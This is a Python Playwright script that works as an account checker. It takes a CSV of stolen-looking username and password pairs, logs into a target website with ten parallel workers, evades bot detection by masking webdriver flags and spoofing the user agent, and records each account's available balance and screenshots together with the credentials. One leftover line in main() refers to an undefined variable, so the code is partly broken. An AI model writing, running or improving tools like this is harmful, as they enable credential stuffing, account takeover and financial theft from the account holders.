import asyncio
import csv
import json
import os
from datetime import datetime
from playwright.async_api import async_playwright

# ================= CONFIG =================
MAX_WORKERS = 10
MAX_RETRIES = 5

ACCOUNTS_FILE = "instamatch_passwords1.csv"
RESULTS_FILE = "account_balances.csv"
PROGRESS_FILE = "progress.json"
SCREENSHOTS_DIR = "screenshots"
SELECTORS_FILE = "selectors.json"

csv_lock = asyncio.Lock()
progress_lock = asyncio.Lock()

# ================= PROGRESS =================
def load_progress():
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            return set(json.load(f))
    return set()

async def save_progress(username):
    async with progress_lock:
        completed = load_progress()
        completed.add(username)
        with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(list(completed)), f, indent=2)

# ================= CSV SAVE =================
async def save_result(row):
    async with csv_lock:
        file_exists = os.path.exists(RESULTS_FILE)
        with open(RESULTS_FILE, "a", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(
                f,
                fieldnames=["username", "password", "balance", "status", "error", "timestamp"]
            )
            if not file_exists:
                writer.writeheader()

            row["timestamp"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
            writer.writerow(row)

# ================= CORE LOGIC =================
async def process_account(browser, account, selectors):
    username = account["username"]
    password = account["password"]

    context = await browser.new_context(
        viewport={"width": 1920, "height": 1080},
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        java_script_enabled=True,
        locale="en-US",
    )
    # Anti-detect script injection
    await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    
    page = await context.new_page()

    try:
        # Speed optimization
        await page.route(
            "**/*",
            lambda route: route.abort()
            if route.request.resource_type in ["image", "media", "font"]
            else route.continue_(),
        )

        await page.goto(selectors["website"], timeout=60000)

        await page.fill(selectors["username_field"], username)
        await page.fill(selectors["password_field"], password)
        await page.press(selectors["password_field"], "Enter")

        await page.wait_for_selector(selectors["avaliable_balance"], timeout=20000)
        balance = (await page.inner_text(selectors["avaliable_balance"])).strip()

        os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
        await page.screenshot(
            path=os.path.join(SCREENSHOTS_DIR, f"{username}.png"),
            full_page=True,
        )

        return {
            "username": username,
            "password": password,
            "balance": balance,
            "status": "Success",
            "error": "",
        }

    finally:
        await context.close()

# ================= WORKER =================
async def worker(worker_id, queue, browser, selectors):
    while True:
        try:
            account = queue.get_nowait()
        except asyncio.QueueEmpty:
            return

        username = account["username"]

        for attempt in range(1, MAX_RETRIES + 1):
            try:
                result = await process_account(browser, account, selectors)

                if result["balance"]:
                    await save_result(result)
                    await save_progress(username)
                    break
                else:
                    raise Exception("Empty balance")

            except Exception as e:
                if attempt == MAX_RETRIES:
                    await save_result({
                        "username": username,
                        "password": account["password"],
                        "balance": "N/A",
                        "status": "Failed",
                        "error": str(e),
                    })

                    try:
                        ctx = await browser.new_context()
                        pg = await ctx.new_page()
                        await pg.goto(selectors["website"], timeout=30000)
                        await pg.screenshot(
                            path=os.path.join(SCREENSHOTS_DIR, f"{username}_ERROR.png")
                        )
                        await ctx.close()
                    except:
                        pass

                else:
                    await asyncio.sleep(2)

        queue.task_done()

# ================= MAIN =================
async def main():
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

    with open(SELECTORS_FILE, "r", encoding="utf-8") as f:
        selectors = json.load(f)

    completed = load_progress()

    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"Error: {ACCOUNTS_FILE} not found.")
        return

    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row["username"] and row["username"] not in completed:
                accounts.append(row)

    if not accounts:
        print("Nothing left to process.")
        return

    queue = asyncio.Queue()
    for acc in accounts:
        queue.put_nowait(acc)

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
            ],
        )

        workers = [
            asyncio.create_task(worker(i, queue, browser, selectors))
        ] # Reduce workers to avoid rapid-fire blocking for now? No, kept logic but let's change context.

        workers = [
            asyncio.create_task(worker(i, queue, browser, selectors))
            for i in range(MAX_WORKERS)
        ]

        await asyncio.gather(*workers)
        await browser.close()

    print("All done.")

if __name__ == "__main__":
    asyncio.run(main())
